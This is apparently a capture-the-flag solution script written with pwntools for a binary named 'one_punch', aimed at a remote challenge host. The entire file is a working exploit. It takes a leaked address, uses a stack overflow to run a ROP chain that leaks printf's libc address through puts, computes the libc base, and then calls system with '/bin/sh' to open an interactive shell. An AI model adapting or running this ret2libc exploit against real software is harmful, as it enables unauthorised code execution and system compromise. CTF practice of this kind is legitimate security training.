#!/usr/bin/env python3

from pwn import *

exe = ELF("./one_punch_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    #r = process([exe.path])
    r = remote("netcat.deadsec.quest", 31794)
    return r


def main():
    r = conn()
    
    r.recvuntil("Don't forget your cape! ")
    leak = int(r.recvline().strip(), 16)
    log.info("leak 0x%x\n", leak)
    
    exe.address = leak - 0x1291
    pause()
    r.recvline()

    pop_rdi = exe.address + 0x0000000000001291

    payload  = b"M"*120
    payload += p64(pop_rdi)
    payload += p64(exe.got["printf"])
    payload += p64(exe.plt["puts"])
    payload += p64(pop_rdi)
    payload += p64(exe.sym.mapped_region)
    payload += p64(exe.plt["gets"])
    payload += p64(pop_rdi + 1)
    payload += p64(exe.sym.main)
    r.sendline(payload)


    r.sendline(p64(0))
    libc_leak = u64(r.recvline().strip() + p16(0))
    log.info("libc leak @ 0x%x", libc_leak)
    libc.address = libc_leak - libc.sym.printf
    log.info("libc base @ 0x%x", libc.address)
    
    payload  = b"M"*120
    payload += p64(pop_rdi)
    payload += p64(next(libc.search(b"/bin/sh")))
    payload += p64(pop_rdi + 1)
    payload += p64(libc.sym.system)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
